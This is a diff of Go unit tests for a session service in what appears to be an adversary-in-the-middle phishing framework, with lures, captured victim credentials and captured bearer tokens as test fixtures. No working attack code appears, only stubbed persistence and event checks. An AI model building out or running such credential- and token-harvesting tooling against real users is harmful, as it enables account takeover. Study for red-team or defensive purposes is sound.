@@ -70,7 +70,7 @@ func newSessionService() (*aitm.SessionService, *stubSessionStore, *stubBus) {
 
 func TestSessionService_NewSession_CachesAndPersists(t *testing.T) {
 	svc, store, bus := newSessionService()
-	sess, err := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test")
+	sess, err := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
 	if err != nil {
 		t.Fatalf("NewSession: %v", err)
 	}
@@ -130,7 +130,7 @@ func TestSessionService_Get_NotFound(t *testing.T) {
 
 func TestSessionService_Complete_EvictsFromCache(t *testing.T) {
 	svc, store, bus := newSessionService()
-	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test")
+	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
 
 	if err := svc.Complete(sess); err != nil {
 		t.Fatalf("Complete: %v", err)
@@ -156,7 +156,7 @@ func TestSessionService_Complete_EvictsFromCache(t *testing.T) {
 
 func TestSessionService_CaptureCredentials_PersistsAndPublishes(t *testing.T) {
 	svc, store, bus := newSessionService()
-	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test")
+	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
 	sess.Username = "victim@example.com"
 	sess.Password = "hunter2"
 
@@ -176,16 +176,35 @@ func TestSessionService_CaptureCredentials_PersistsAndPublishes(t *testing.T) {
 	}
 }
 
-func TestSessionService_Update_PersistsAndPublishesTokensCaptured(t *testing.T) {
+func TestSessionService_Update_PersistsWithoutEvent(t *testing.T) {
 	svc, store, bus := newSessionService()
-	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test")
-	sess.HTTPTokens = map[string]string{"X-Auth": "bearer-abc"}
+	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
+	sess.Custom = map[string]string{"campaign": "test"}
 
 	if err := svc.Update(sess); err != nil {
 		t.Fatalf("Update: %v", err)
 	}
 
-	// Tokens should be persisted
+	stored := store.sessions[sess.ID]
+	if stored.Custom["campaign"] != "test" {
+		t.Errorf("stored custom = %q, want %q", stored.Custom["campaign"], "test")
+	}
+
+	// Update should not publish any event (only EventSessionCreated from NewSession).
+	if len(bus.published) != 1 {
+		t.Errorf("expected 1 event (session created only), got %d", len(bus.published))
+	}
+}
+
+func TestSessionService_CaptureTokens_PersistsAndPublishes(t *testing.T) {
+	svc, store, bus := newSessionService()
+	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
+	sess.HTTPTokens = map[string]string{"X-Auth": "bearer-abc"}
+
+	if err := svc.CaptureTokens(sess); err != nil {
+		t.Fatalf("CaptureTokens: %v", err)
+	}
+
 	stored := store.sessions[sess.ID]
 	if stored.HTTPTokens["X-Auth"] != "bearer-abc" {
 		t.Errorf("stored HTTP token = %q, want %q", stored.HTTPTokens["X-Auth"], "bearer-abc")
@@ -203,7 +222,7 @@ func TestSessionService_Update_PersistsAndPublishesTokensCaptured(t *testing.T) 
 
 func TestSessionService_Delete_EvictsFromCacheAndStore(t *testing.T) {
 	svc, store, _ := newSessionService()
-	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test")
+	sess, _ := svc.NewSession("1.2.3.4", "", "Mozilla/5.0", "lure-1", "test", nil)
 
 	if err := svc.Delete(sess.ID); err != nil {
 		t.Fatalf("Delete: %v", err)
